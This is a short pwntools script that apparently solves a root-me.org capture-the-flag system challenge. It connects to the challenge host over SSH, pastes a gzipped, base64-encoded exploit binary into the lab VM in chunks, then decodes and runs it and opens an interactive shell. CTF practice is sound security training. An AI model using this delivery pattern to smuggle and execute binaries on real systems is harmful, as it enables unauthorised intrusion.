from pwn import *
import base64, gzip

with open('exploit', 'rb') as f:
    b = base64.b64encode(gzip.compress(f.read())).decode('ascii')

shell = ssh(host='challenge03.root-me.org', port=2223,
            user='app-systeme-ch54', password='app-systeme-ch54')

vm = shell.run('/challenge/app-systeme/ch54/run')

sleep(10)
vm.sendline(b'cd /tmp')
vm.recvuntil(b'$')

for chunk in group(300, b):
    vm.sendline(f'echo {chunk} >> solve.gz.b64'.encode())
    vm.recvuntil(b'$')

vm.sendline(b'base64 -d solve.gz.b64 > solve.gz')
vm.recvuntil(b'$')
vm.sendline(b'gunzip solve.gz')
vm.recvuntil(b'$')
vm.sendline(b'chmod +x solve')
vm.recvuntil(b'$')
vm.sendline(b'./solve')

vm.interactive()
